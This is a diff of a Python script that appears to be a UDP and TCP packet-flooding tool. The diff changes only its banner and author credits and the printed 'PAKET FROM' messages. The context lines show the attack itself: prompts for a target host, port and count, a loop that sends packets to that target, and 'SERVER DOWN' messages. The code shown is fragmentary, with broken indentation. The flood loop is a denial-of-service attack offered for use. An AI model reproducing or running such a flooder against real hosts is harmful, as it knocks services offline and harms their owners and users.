@@ -9,13 +9,13 @@ import sys
 
 
 os.system("clear")
-print(" AUTOR : XALBADOR
-print("██╗░░██╗")
-print("╚██╗██╔╝")
-print("░╚███╔╝░")
-print("░██╔██╗░")
-print("██╔╝╚██╗")
-print("╚═╝░░╚═╝")
+print(" Remake : XALBADOR")
+print("██╗░░██╗###############██")
+print("╚██╗██╔╝|Autor : 4ZIZ   |")
+print("░╚███╔╝░|Yang Mau Rename|")
+print("░██╔██╗░|Pm me !!!!     |")
+print("██╔╝╚██╗|XalbadorX Team |")
+print("╚═╝░░╚═╝###############██")
 
 ip = str(input(" Host/Ip:"))
 port = int(input(" Port:"))
@@ -31,7 +31,7 @@ s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 addr = (str(ip),int(port))
 for x in range(times):
 s.sendto(data,addr)
-print(i +" PAKET FROM XALBADOR!!!")
+print(i +" PAKET FROM XALBADORx4ZIZ!!!")
 except:
 print("[!] SERVER DOWN..!!!")
 
@@ -45,7 +45,7 @@ s.connect((ip,port))
 s.send(data)
 for x in range(times):
 s.send(data)
-print(i +" PAKET FROM XALBADOR!!!")
+print(i +" PAKET FROM XALBADORx4ZIZ!!!")
 except:
 s.close()
 print("[*] SERVER DOWN..!!!")
